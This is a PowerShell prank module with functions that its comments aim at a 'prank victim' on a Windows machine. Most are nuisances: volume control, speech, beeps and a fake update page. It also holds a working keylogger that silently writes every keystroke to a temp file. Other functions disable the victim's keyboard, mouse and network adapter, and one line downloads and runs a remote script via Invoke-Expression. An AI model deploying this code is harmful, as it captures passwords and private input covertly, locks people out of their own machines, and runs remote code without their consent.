Function touch {
    param (
        [string]$file
    )

    $dir = Split-Path $file

    if (Test-Path $file) {
        Get-Item $file
    } elseif ($dir -and !(Test-Path -LiteralPath $dir)) {
        $null = mkdir $dir
        $null = New-Item $file -ItemType File
    } else {
        $null = New-Item $file -ItemType File
    }
}

function Get-Monitor {
    [CmdletBinding()]
    param (
        [Parameter(ValueFromPipeline=$True,ValueFromPipelineByPropertyName=$True)]
        [String[]]$ComputerName = $env:ComputerName
    )

    $ManufacturerHash = @{
        AAC = 'AcerView'
        ACR = 'Acer'
        AOC = 'AOC'
        AIC = 'AG Neovo'
        APP = 'Apple Computer'
        AST = 'AST Research'
        AUO = 'Asus'
        BNQ = 'BenQ'
        CMO = 'Acer'
        CPL = 'Compal'
        CPQ = 'Compaq'
        CPT = 'Chunghwa Pciture Tubes, Ltd.'
        CTX = 'CTX'
        DEC = 'DEC'
        DEL = 'Dell'
        DPC = 'Delta'
        DWE = 'Daewoo'
        EIZ = 'EIZO'
        ELS = 'ELSA'
        ENC = 'EIZO'
        EPI = 'Envision'
        FCM = 'Funai'
        FUJ = 'Fujitsu'
        FUS = 'Fujitsu-Siemens'
        GSM = 'LG Electronics'
        GWY = 'Gateway 2000'
        HEI = 'Hyundai'
        HIT = 'Hyundai'
        HSL = 'Hansol'
        HTC = 'Hitachi/Nissei'
        HWP = 'HP'
        IBM = 'IBM'
        ICL = 'Fujitsu ICL'
        IVM = 'Iiyama'
        KDS = 'Korea Data Systems'
        LEN = 'Lenovo'
        LGD = 'Asus'
        LPL = 'Fujitsu'
        MAX = 'Belinea' 
        MEI = 'Panasonic'
        MEL = 'Mitsubishi Electronics'
        MS_ = 'Panasonic'
        NAN = 'Nanao'
        NEC = 'NEC'
        NOK = 'Nokia Data'
        NVD = 'Fujitsu'
        OPT = 'Optoma'
        PHL = 'Philips'
        REL = 'Relisys'
        SAN = 'Samsung'
        SAM = 'Samsung'
        SBI = 'Smarttech'
        SGI = 'SGI'
        SNY = 'Sony'
        SRC = 'Shamrock'
        SUN = 'Sun Microsystems'
        SEC = 'Hewlett-Packard'
        TAT = 'Tatung'
        TOS = 'Toshiba'
        TSB = 'Toshiba'
        VSC = 'ViewSonic'
        ZCM = 'Zenith'
        UNK = 'Unknown'
        _YV = 'Fujitsu'
    }

    foreach ($Computer in $ComputerName) {
        
        $Monitors = Get-WmiObject -Namespace root\WMI -Class WMIMonitorID -ComputerName $Computer -ErrorAction SilentlyContinue
        foreach ($Monitor in $Monitors) {
            
            $Mon_Model = try{ ([System.Text.Encoding]::ASCII.GetString($Monitor.UserFriendlyName)).Replace([string][char]0x0000, '') }catch{}
            $Mon_Serial_Number = ([System.Text.Encoding]::ASCII.GetString($Monitor.SerialNumberID)).Replace([string][char]0x0000, '')
            $Mon_Attached_Computer = ($Monitor.PSComputerName).Replace([string][char]0x0000, '')
            $Mon_Manufacturer = ([System.Text.Encoding]::ASCII.GetString($Monitor.ManufacturerName)).Replace([string][char]0x0000, '')
            $Mon_Manufacturer_Friendly = $ManufacturerHash.$Mon_Manufacturer
            if ($Mon_Manufacturer_Friendly -eq $null) {
                $Mon_Manufacturer_Friendly = $Mon_Manufacturer
            }
            [pscustomobject]@{
                Computer = $Mon_Attached_Computer
                Manufacturer = $Mon_Manufacturer_Friendly
                Model = $Mon_Model
                SerialNumber = $Mon_Serial_Number
                YearOfManufacture = $Monitor.YearOfManufacture
                WeekOfManufacture = $Monitor.WeekOfManufacture
            }
        }
    }
}

Function Keystrokes()
{
   [int]$totalNumber = 0
   $Path = "$Env:TMP\keys.log"
   echo $pid > $Env:TMP\pid.log #Store Process PID to be abble to stop it later


#API Calls
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

   #Load signatures and make members available
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
   #Create output file
   $null = New-Item -Path $Path -ItemType File -Force

   try{
      Write-Host "* " -ForegroundColor Green -NoNewline;
      Write-Host "Keylogger is working with ID: " -ForegroundColor DarkGray -NoNewline;
      Write-Host "$pid" -ForegroundColor Green
      Write-Host "  => Press CTRL+C to stop process .." -ForegroundColor DarkYellow

      ## Create endless loop
      # collect pressed keys, CTRL+C to exit
      While($true)
      {
         Start-Sleep -Milliseconds 20
         #Scan  ASCII codes between 8 and 129
         For($ascii = 9; $ascii -le 128; $ascii++) 
         {
            #Get current key state
            $state = $API::GetAsyncKeyState($ascii)
            #Is key pressed?
            If($state -eq -32767) 
            {
               $null = [console]::CapsLock

               #Translate scan code to real code
               $virtualKey = $API::MapVirtualKey($ascii, 3)

               #Get keyboard state for virtual keys
               $kbstate = New-Object Byte[] 256
               $checkkbstate = $API::GetKeyboardState($kbstate)

               #Prepare a StringBuilder to receive input key
               $mychar = New-Object -TypeName System.Text.StringBuilder

               #Translate virtual key
               $qsuccess = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                 If($qsuccess) 
                 {
                    #add key to logger file
                    [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                    $totalNumber = $totalNumber+1
                 }
              }
          }
       }
   }
   finally
   {
      write-Host "* " -ForegroundColor Green -NoNewline;
      write-Host "Total Number of Keystrokes: " -ForegroundColor DarkGray -NoNewline;
      write-Host "$totalNumber" -ForegroundColor Green 
      write-host "$Path"
   }
}

Function KillProcess {
$listapps = Get-Process | Select-Object ProcessName
echo $listapps | Format-Wide -Column 6
$Application = Read-Host -Prompt "Entrer le nom de l'application"
    if (-not($Application)) {
        Write-Host "$Application `n" -ForegroundColor Green
    }
    elseif ($Application) {
        Write-Host "Nom de l'application: $Application `n" -ForegroundColor Green
    }
  foreach($App in $listapps)
  {
     if($App -match $Application)
        {
        $name = $App
        
        }
  }
echo $name.ProcessName
Stop-process -Name $name.ProcessName -Force   
}

Function Eject-ALLDevices()
{
    $lettre = Get-WmiObject -Class Win32_logicaldisk | Where { $_.DriveType -eq "5" } | ForEach-Object {$_.DeviceID}
    $nombre = $lettre.count
    foreach ($UnPC in $lettre) {
        (new-object -COM Shell.Application).NameSpace(17).ParseName("$UnPC").InvokeVerb("Eject")
        }
}

Function Start-AudioControl {
Add-Type -TypeDefinition '
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume
{
    // f(), g(), ... are unused COM method slots. Define these if you care
    int f(); int g(); int h(); int i();
    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
    int j();
    int GetMasterVolumeLevelScalar(out float pfLevel);
    int k(); int l(); int m(); int n();
    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
    int GetMute(out bool pbMute);
}
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice
{
    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator
{
    int f(); // Unused
    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
}
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
public class Audio
{
    static IAudioEndpointVolume Vol()
    {
        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
        IMMDevice dev = null;
        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));
        IAudioEndpointVolume epv = null;
        var epvid = typeof(IAudioEndpointVolume).GUID;
        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));
        return epv;
    }
    public static float Volume
    {
        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }
    }
    public static bool Mute
    {
        get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }
    }
}
'
}

Function Set-AudioMax {
    Start-AudioControl
    [audio]::Volume = 1
}

Function Set-AudioMin {
    Start-AudioControl
    [audio]::Volume = 0
}


Function Get-AudioLevel {
   Start-AudioControl
   [audio]::Volume
}


Function Set-AudioLevel {
    Param(
        [parameter(Mandatory=$true)]
        [ValidateRange(0,1)]
        [double]$AudioLevel
    )

    Start-AudioControl
    [audio]::Volume = $AudioLevel
}


Function Unmute-Audio {
    Start-AudioControl
    [Audio]::Mute = $false
}


Function Mute-Audio {
    Start-AudioControl
    [Audio]::Mute = $true
}

Function Sleep-Mode
{
    C:/Windows/System32/rundll32.exe powrprof.dll,SetSuspendState Sleep
}

Function VoiceMessage([string]$Message)
{
    Add-Type -AssemblyName System.speech
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $SpeechSynth.Speak($Message)
}

Function Minimize-Apps
{
    $apps = New-Object -ComObject Shell.Application
    $apps.MinimizeAll()
}

Function Close-CDDrive{
    Add-Type -TypeDefinition  @'
    using System;
    using System.Runtime.InteropServices;
    using System.ComponentModel;
     
    namespace CDROM
    {
        public class Commands
        {
            [DllImport("winmm.dll")]
            static extern Int32 mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);
     
            public static void Eject()
            {
                 string rt = "";
                 mciSendString("set CDAudio door open", rt, 127, IntPtr.Zero);
            }
     
            public static void Close()
            {
                 string rt = "";
                 mciSendString("set CDAudio door closed", rt, 127, IntPtr.Zero);
            }
        }
    }  
'@

[CDROM.Commands]::Close()
}

Function Open-CDDrive
{
    Add-Type -TypeDefinition  @'
    using System;
    using System.Runtime.InteropServices;
    using System.ComponentModel;
     
    namespace CDROM
    {
        public class Commands
        {
            [DllImport("winmm.dll")]
            static extern Int32 mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);
     
            public static void Eject()
            {
                 string rt = "";
                 mciSendString("set CDAudio door open", rt, 127, IntPtr.Zero);
            }
     
            public static void Close()
            {
                 string rt = "";
                 mciSendString("set CDAudio door closed", rt, 127, IntPtr.Zero);
            }
        }
    }  
'@

[CDROM.Commands]::Eject()
}

Function Enable-Mouse
{
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Enable()
}

Function Disable-Mouse
{
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Disable()
}

Function Set-Wallpaper {
    param (
        [string]$Path,
        [ValidateSet('Tile', 'Center', 'Stretch', 'Fill', 'Fit', 'Span')]
        [string]$Style = 'Fill'
    )

    begin {
        Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Win32;
        namespace Wallpaper
        {
        public enum Style : int
        {
        Tile, Center, Stretch, Fill, Fit, Span, NoChange
        }
        public class Setter {
        public const int SetDesktopWallpaper = 20;
        public const int UpdateIniFile = 0x01;
        public const int SendWinIniChange = 0x02;
        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
        public static void SetWallpaper ( string path, Wallpaper.Style style ) {
        SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
        RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
        switch( style )
        {
        case Style.Tile :
        key.SetValue(@"WallpaperStyle", "0") ;
        key.SetValue(@"TileWallpaper", "1") ;
        break;
        case Style.Center :
        key.SetValue(@"WallpaperStyle", "0") ;
        key.SetValue(@"TileWallpaper", "0") ;
        break;
        case Style.Stretch :
        key.SetValue(@"WallpaperStyle", "2") ;
        key.SetValue(@"TileWallpaper", "0") ;
        break;
        case Style.Fill :
        key.SetValue(@"WallpaperStyle", "10") ;
        key.SetValue(@"TileWallpaper", "0") ;
        break;
        case Style.Fit :
        key.SetValue(@"WallpaperStyle", "6") ;
        key.SetValue(@"TileWallpaper", "0") ;
        break;
        case Style.Span :
        key.SetValue(@"WallpaperStyle", "22") ;
        key.SetValue(@"TileWallpaper", "0") ;
        break;
        case Style.NoChange :
        break;
        }
        key.Close();
        }
        }
        }
"@

        $StyleNum = @{
            Tile = 0
            Center = 1
            Stretch = 2
            Fill = 3
            Fit = 4
            Span = 5
        }

        function Resolve-FullPath {
            [CmdletBinding()]
            param (
                [Parameter(Mandatory=$true)]
                [string]
                # The path to resolve. Must be rooted, i.e. have a drive at the beginning.
                $Path = $(Throw 'No path provided.')
            )
    
            if ( -not ([IO.Path]::IsPathRooted($Path)) ) {
                # $Path = "$PWD\$Path"
                $Path = Join-Path (Get-Location) $Path
            }
            [IO.Path]::GetFullPath($Path)
        }
    }

    process {
        [Wallpaper.Setter]::SetWallpaper($Path, $StyleNum[$Style])
        [Wallpaper.Setter]::SetWallpaper($Path, $StyleNum[$Style])
    }
}

Function boucle {
    foreach ($application in $Software) {

            if ($application -match $Name) {
                $DName = $Application.DisplayName
                $Uninstall = $Application.UnInstallString
                $NameOrganisation = $Application.Publisher
                $Version = $Application.DisplayVersion
                $Date = $Application.InstallDate
                Write-Host -ForegroundColor Green "Application name: " -NoNewline
                Write-Host -ForegroundColor White "$DName"
                Write-Host -ForegroundColor Green "Version: " -NoNewline
                Write-Host -ForegroundColor White "$Version"
                Write-Host -ForegroundColor Green "Installation date: " -NoNewline
                Write-Host -ForegroundColor White "$Date"
                Write-Host -ForegroundColor Green "Uninstall string: " -NoNewline
                Write-Host -ForegroundColor White "$Uninstall"
                Write-Host -ForegroundColor Green "Organization name: " -NoNewline
                Write-Host -ForegroundColor White "$NameOrganisation`n"
                $i = $i + 1
            }
        }
        if ($i -eq 0) {
            Write-Host "$Name has not been found or is not installed !`n" -ForegroundColor Red
        }
}

Function search {
   
    [CmdletBinding()]
    Param([Parameter(Mandatory=$false)]
    [string]$Name = '')
    $Software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName, UninstallString, Publisher, DisplayVersion, InstallDate
    $i = 0
    
    if ($PSBoundParameters.Keys.Contains("Name"))
    {
        boucle
    }
    else {
        $Name = Read-Host -Prompt "Enter the application name"
        if (-not($Name)) {
            Write-Host "Please enter the application name " -ForegroundColor Red
            Write-Host "All applications :`n " -ForegroundColor Green
            sleep 1
        }
        elseif ($Name) {
            Write-Host "The results for $Name are:`n" -ForegroundColor Green
        }
        boucle
    }
}

Function Get-WAVWebList
{
    #Credits: https://pastebin.com/1GGJ8fCg

    $List = @(
    'http://www.wavlist.com/movies/011/ha-filthy.wav',
    'http://www.wavlist.com/humor/001/cbdick.wav',
    'http://www.wavlist.com/humor/001/grndhog.wav',
    'http://www.wavlist.com/humor/001/duckjob.wav',
    'http://sounds.stoutman.com/sounds/bitchass.wav',
    'http://sounds.stoutman.com/sounds/dirtyrat.wav',
    'http://sounds.stoutman.com/sounds/heybitch.wav',
    'http://sounds.stoutman.com/sounds/perv.wav',
    'http://sounds.stoutman.com/sounds/puckerup.wav',
    'http://sounds.stoutman.com/sounds/shithead.wav',
    'http://sounds.stoutman.com/sounds/yousmell.wav',
    'http://sounds.stoutman.com/sounds/fartlaff.wav',
    'http://sounds.stoutman.com/sounds/dplaugh.wav'
   )

   return $List
}

Function Send-WAVWeb
{
    Param(
        [parameter(Mandatory=$true)]
        [string]$URL
    )

    if(Test-Path "DownloadedWAVFile.wav")
    {
        Remove-Item "DownloadedWAVFile.wav" -Force
    }

    Invoke-WebRequest -Uri $URL -OutFile "DownloadedWAVFile.wav"

    $filepath = ((Get-Childitem "DownloadedWAVFile.wav").FullName)

    $sound = new-Object System.Media.SoundPlayer;
    $sound.SoundLocation=$filepath;
    $sound.Play();
}

Function Disable-Keyboard
{
    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
    $PNPKeyboard.Disable()
}

Function Enable-Keyboard
{
    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
    $PNPKeyboard.Enable()
}

Function Send-Joke {
    Param(
       [switch]$AsMessageBox
    )

    $Joke = Invoke-RestMethod -Uri 'https://official-joke-api.appspot.com/jokes/random' -Method Get

    if ($AsMessageBox)
    {
        $Message = (($Joke).setup) + " " + ($Joke).punchline
        msg.exe * $Message
    }
    else {
        Add-Type -AssemblyName System.speech
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
        $SpeechSynth.Speak(($Joke).setup)
        Start-Sleep -Seconds 1
        $SpeechSynth.Speak(($Joke).punchline)
    }
}

Function Send-CatFact 
{
    Add-Type -AssemblyName System.speech
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $CatFact = Invoke-RestMethod -Uri 'https://catfact.ninja/fact' -Method Get | Select-Object -ExpandProperty fact
    $SpeechSynth.Speak("did you know?")
    $SpeechSynth.Speak($CatFact)
}

#Sends a random Chuck Norris fact to your prank victim
Function Send-ChuckNorrisFact 
{
    Add-Type -AssemblyName System.speech
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $ChuckFact = Invoke-RestMethod -Uri 'https://api.chucknorris.io/jokes/random' -Method Get | Select-Object -ExpandProperty Value
    $SpeechSynth.Speak("did you know?")
    $SpeechSynth.Speak($ChuckFact)
}

#Sends a random Dad Joke to your prank victim
Function Send-DadJoke 
{
    Add-Type -AssemblyName System.speech
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Accept", 'text/plain')
    
    $DadJoke = Invoke-RestMethod -Uri 'https://icanhazdadjoke.com' -Method Get -Headers $headers
    
    $SpeechSynth.Speak($DadJoke)
}

#Sends the best song ever to your prank victim
Function Send-RickRoll 
{
    Invoke-Expression (New-Object Net.WebClient).DownloadString("https://www.leeholmes.com/projects/ps_html5/Invoke-PSHtml5.ps1")
}

#Sends epic gandalf
Function Send-Gandalf
{
    Set-AudioLevel(0.4) #For optimal surprise
    Start-Process iexplore -ArgumentList "-k https://player.vimeo.com/video/198392879?autoplay=1"
}

#Opens up ie and sends user to a fake win10 update page and fullscreens ie
Function Send-FakeUpdate
{ 
    Start-Process iexplore -ArgumentList "-k http://fakeupdate.net/win10u/"
}

#Sends Row, Row, Row your boat to your prank victim
Function Send-RowBoat 
{
    Add-Type -AssemblyName System.speech
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $SpeechSynth.Speak("Row, Row, Row your boat gently down the stream. Merrily! Merrily! Merrily! Life is but a dream.")    
}

Function Send-Message([string]$Message)
{
    msg.exe * $Message
}

Function Send-Alarm
{
    Invoke-WebRequest -Uri "https://github.com/perplexityjeff/PowerShell-Troll/raw/master/AudioFiles/Wake-up-sounds.wav" -OutFile "Wake-up-sounds.wav"

    $filepath = ((Get-Childitem "Wake-up-sounds.wav").FullName)
    
    Write-Host $filepath

    $sound = new-Object System.Media.SoundPlayer;
    $sound.SoundLocation=$filepath;
    $sound.Play();
}

Function Send-NotificationSoundSpam
{
    param
    (
        [Parameter()][int]$Interval = 4
    )

    Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | Foreach-Object { Start-Sleep -Seconds $Interval; (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").Play(); }
}

Function Send-SuperMario
{
    Function b($a,$b){
        [console]::beep($a,$b)
    }
    
    Function s($a){
        Start-Sleep -m $a
    }    

    b 660 100;
    s 150;
    b 660 100;
    s 300;
    b 660 100;
    s 300;
    b 510 100;
    s 100;
    b 660 100;
    s 300;
    b 770 100;
    s 550;
    b 380 100;
    s 575;

    b 510 100;
    s 450;
    b 380 100;
    s 400;
    b 320 100;
    s 500;
    b 440 100;
    s 300;
    b 480 80;
    s 330;
    b 450 100;
    s 150;
    b 430 100;
    s 300;
    b 380 100;
    s 200;
    b 660 80;
    s 200;
    b 760 50;
    s 150;
    b 860 100;
    s 300;
    b 700 80;
    s 150;
    b 760 50;
    s 350;
    b 660 80;
    s 300;
    b 520 80;
    s 150;
    b 580 80;
    s 150;
    b 480 80;
    s 500;

    b 510 100;
    s 450;
    b 380 100;
    s 400;
    b 320 100;
    s 500;
    b 440 100;
    s 300;
    b 480 80;
    s 330;
    b 450 100;
    s 150;
    b 430 100;
    s 300;
    b 380 100;
    s 200;
    b 660 80;
    s 200;
    b 760 50;
    s 150;
    b 860 100;
    s 300;
    b 700 80;
    s 150;
    b 760 50;
    s 350;
    b 660 80;
    s 300;
    b 520 80;
    s 150;
    b 580 80;
    s 150;
    b 480 80;
    s 500;

    b 500 100;
    s 300;

    b 760 100;
    s 100;
    b 720 100;
    s 150;
    b 680 100;
    s 150;
    b 620 150;
    s 300;

    b 650 150;
    s 300;
    b 380 100;
    s 150;
    b 430 100;
    s 150;

    b 500 100;
    s 300;
    b 430 100;
    s 150;
    b 500 100;
    s 100;
    b 570 100;
    s 220;

    b 500 100;
    s 300;

    b 760 100;
    s 100;
    b 720 100;
    s 150;
    b 680 100;
    s 150;
    b 620 150;
    s 300;

    b 650 200;
    s 300;

    b 1020 80;
    s 300;
    b 1020 80;
    s 150;
    b 1020 80;
    s 300;

    b 380 100;
    s 300;
    b 500 100;
    s 300;

    b 760 100;
    s 100;
    b 720 100;
    s 150;
    b 680 100;
    s 150;
    b 620 150;
    s 300;

    b 650 150;
    s 300;
    b 380 100;
    s 150;
    b 430 100;
    s 150;

    b 500 100;
    s 300;
    b 430 100;
    s 150;
    b 500 100;
    s 100;
    b 570 100;
    s 420;

    b 585 100;
    s 450;

    b 550 100;
    s 420;

    b 500 100;
    s 360;

    b 380 100;
    s 300;
    b 500 100;
    s 300;
    b 500 100;
    s 150;
    b 500 100;
    s 300;

    b 500 100;
    s 300;

    b 760 100;
    s 100;
    b 720 100;
    s 150;
    b 680 100;
    s 150;
    b 620 150;
    s 300;

    b 650 150;
    s 300;
    b 380 100;
    s 150;
    b 430 100;
    s 150;

    b 500 100;
    s 300;
    b 430 100;
    s 150;
    b 500 100;
    s 100;
    b 570 100;
    s 220;

    b 500 100;
    s 300;

    b 760 100;
    s 100;
    b 720 100;
    s 150;
    b 680 100;
    s 150;
    b 620 150;
    s 300;

    b 650 200;
    s 300;

    b 1020 80;
    s 300;
    b 1020 80;
    s 150;
    b 1020 80;
    s 300;

    b 380 100;
    s 300;
    b 500 100;
    s 300;

    b 760 100;
    s 100;
    b 720 100;
    s 150;
    b 680 100;
    s 150;
    b 620 150;
    s 300;

    b 650 150;
    s 300;
    b 380 100;
    s 150;
    b 430 100;
    s 150;

    b 500 100;
    s 300;
    b 430 100;
    s 150;
    b 500 100;
    s 100;
    b 570 100;
    s 420;

    b 585 100;
    s 450;

    b 550 100;
    s 420;

    b 500 100;
    s 360;

    b 380 100;
    s 300;
    b 500 100;
    s 300;
    b 500 100;
    s 150;
    b 500 100;
    s 300;

    b 500 60;
    s 150;
    b 500 80;
    s 300;
    b 500 60;
    s 350;
    b 500 80;
    s 150;
    b 580 80;
    s 350;
    b 660 80;
    s 150;
    b 500 80;
    s 300;
    b 430 80;
    s 150;
    b 380 80;
    s 600;

    b 500 60;
    s 150;
    b 500 80;
    s 300;
    b 500 60;
    s 350;
    b 500 80;
    s 150;
    b 580 80;
    s 150;
    b 660 80;
    s 550;

    b 870 80;
    s 325;
    b 760 80;
    s 600;

    b 500 60;
    s 150;
    b 500 80;
    s 300;
    b 500 60;
    s 350;
    b 500 80;
    s 150;
    b 580 80;
    s 350;
    b 660 80;
    s 150;
    b 500 80;
    s 300;
    b 430 80;
    s 150;
    b 380 80;
    s 600;

    b 660 100;
    s 150;
    b 660 100;
    s 300;
    b 660 100;
    s 300;
    b 510 100;
    s 100;
    b 660 100;
    s 300;
    b 770 100;
    s 550;
    b 380 100;
    s 575;
}

Function Send-HappyBirthday
{
    $BeepList = @(
    @{ Pitch = 1059.274; Length = 300; };
    @{ Pitch = 1059.274; Length = 200; };
    @{ Pitch = 1188.995; Length = 500; };
    @{ Pitch = 1059.274; Length = 500; };
    @{ Pitch = 1413.961; Length = 500; };
    @{ Pitch = 1334.601; Length = 950; };

    @{ Pitch = 1059.274; Length = 300; };
    @{ Pitch = 1059.274; Length = 200; };
    @{ Pitch = 1188.995; Length = 500; };
    @{ Pitch = 1059.274; Length = 500; };
    @{ Pitch = 1587.117; Length = 500; };
    @{ Pitch = 1413.961; Length = 950; };

    @{ Pitch = 1059.274; Length = 300; };
    @{ Pitch = 1059.274; Length = 200; };
    @{ Pitch = 2118.547; Length = 500; };
    @{ Pitch = 1781.479; Length = 500; };
    @{ Pitch = 1413.961; Length = 500; };
    @{ Pitch = 1334.601; Length = 500; };
    @{ Pitch = 1188.995; Length = 500; };
    @{ Pitch = 1887.411; Length = 300; };
    @{ Pitch = 1887.411; Length = 200; };
    @{ Pitch = 1781.479; Length = 500; };
    @{ Pitch = 1413.961; Length = 500; };
    @{ Pitch = 1587.117; Length = 500; };
    @{ Pitch = 1413.961; Length = 900; };
    );

    foreach ($Beep in $BeepList) {
        [System.Console]::Beep($Beep['Pitch'], $Beep['Length']);
    }
}

Function Play-song {
Param(
        [parameter(Mandatory=$true)]
        [string]$URL
    )

    if(Test-Path "DownloadedWAVFile.mp3")
    {
        Remove-Item "DownloadedWAVFile.mp3" -Force
    }
    Invoke-WebRequest -Uri $URL -OutFile "DownloadedWAVFile.mp3"
    $filepath = ((Get-Childitem "DownloadedWAVFile.mp3").FullName)
    Add-Type -AssemblyName presentationCore
    $mediaPlayer = New-Object system.windows.media.mediaplayer
    $mediaPlayer.open($filepath)
    $mediaPlayer.Play()
}

Function Disable-Network {
$localIpAddress = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress | select-object -first 1;
$iface = Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, ifIndex;
$iface | foreach{if($_.IPAddress -eq $localIpAddress){$test = $_.IfIndex;echo $_.IPAddress;Get-NetAdapter -ifIndex $test | Disable-NetAdapter -Confirm:$false}}
}

Function Enable-Network {
    Get-NetAdapter -ifIndex $test | Enable-NetAdapter -Confirm:$false
}
